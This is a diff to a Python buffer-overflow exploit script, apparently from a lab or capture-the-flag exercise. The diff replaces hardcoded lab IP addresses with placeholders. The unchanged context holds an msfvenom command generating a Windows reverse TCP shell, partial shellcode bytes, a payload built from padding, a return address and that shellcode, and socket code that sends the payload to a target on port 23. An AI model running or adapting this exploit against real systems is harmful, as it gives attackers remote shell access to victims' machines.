@@ -1,7 +1,7 @@
 import socket,sys
 
 
-#msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.106 LPORT=4444 -f python -a x86 -b '\x00\x00\x4d\x4f\x5f\x79\x7e\x7f'
+#msfvenom -p windows/shell_reverse_tcp LHOST=<MY_IP> LPORT=4444 -f python -a x86 -b '\x00\x00\x4d\x4f\x5f\x79\x7e\x7f'
 buf =  b""
 buf += b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
 buf += b"\x76\x0e\x62\xa6\xa9\xbc\x83\xee\xfc\xe2\xf4\x9e\x4e"
@@ -35,7 +35,7 @@ payload="A"*1902 + "\xd0\x12\x50\x62" + buf
 
 try:
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(('10.0.2.109',23))
+    s.connect(('TARGET_IP',23))
     s.recv(1024)
     s.send(payload)
     s.close()
